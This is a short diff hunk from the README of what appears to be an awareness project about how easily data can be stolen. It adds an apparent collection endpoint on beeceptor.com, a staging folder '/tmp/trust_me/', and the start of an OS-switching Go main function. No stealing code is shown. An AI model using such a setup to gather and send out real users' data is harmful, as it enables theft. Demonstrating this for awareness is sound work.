@@ -33,7 +33,9 @@ This project only purpose is to raise awareness on how easily it is to steal you
 
 Be mindfull of what you download and execute.
 
-url: `
+url: https://miniprojectonnetworksecurity.free.beeceptor.com
+
+folder: /tmp/trust_me/
 
 func main() {
 	switch runtime.GOOS {
